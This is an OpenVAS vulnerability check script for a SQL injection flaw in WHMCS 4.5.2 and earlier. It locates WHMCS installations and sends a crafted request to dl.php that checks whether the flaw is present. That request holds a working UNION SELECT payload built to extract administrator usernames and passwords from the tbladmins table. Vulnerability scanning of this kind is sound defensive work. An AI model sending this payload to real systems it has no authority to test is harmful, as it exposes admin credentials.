###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_whmcs_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WHMCS SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to disclose credentials
  or manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "WHMCS version 4.5.2 and prior";


tag_insight = "Flaw is due to improper sanitation of user supplied input via the 'id'
  parameter to '/whmcs/dl.php' script.";
tag_solution = "Upgrade to WHMCS 5.2 or later,
  For updates refer to http://www.whmcs.com";
tag_summary = "This host is installed with WHMCS and is prone to sql injection
  vulnerability.";

if(description)
{
  script_id(803197);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-14 11:27:14 +0530 (Tue, 14 May 2013)");
  script_name("WHMCS SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121613");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/whmcs-452-sql-injection");
  script_summary("Check if WHMCS is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/whmcs", "/bill", "/support", "/management", cgi_dirs()))
{
  ## Request for the index.php
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## confirm the WHMCS installation
  if(">WHMCompleteSolution<" >< rcvRes && "http://www.whmcs.com/" >< rcvRes)
  {

    ## Construct Attack Request
    url = dir + "/dl.php?type=i&amp;id=1 and 0x0=0x1 union select 1,2,3,4," +
          "CONCAT(username,0x3a3a3a,password),6,7 from tbladmins --";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"filename=*.pdf", extra_check:make_list('CreationDate',
       'ViewerPreferences')))
    {
      security_hole(port);
      exit(0);
    }
  }
}
